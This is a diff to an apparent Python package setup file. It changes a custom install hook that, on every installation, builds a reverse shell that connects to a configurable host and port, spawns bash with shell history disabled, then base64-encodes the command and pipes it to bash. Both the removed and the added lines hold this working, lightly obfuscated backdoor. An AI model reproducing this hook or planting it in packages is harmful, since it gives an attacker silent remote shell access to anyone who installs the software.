@@ -7,9 +7,10 @@ import os
 class CustomInstall(install):
   def run(self):
     install.run(self)
-    RHOST = '10.0.0.2'  # change this
-
-    reverse_shell = 'python -c "import os; import pty; import socket; lhost = \'%s\'; lport = 443; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"' % RHOST
+    LHOST = 'localhost'  # change this
+    LPORT = 13372
+    
+    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
     encoded = base64.b64encode(reverse_shell)
     os.system('echo %s|base64 -d|bash' % encoded)
 
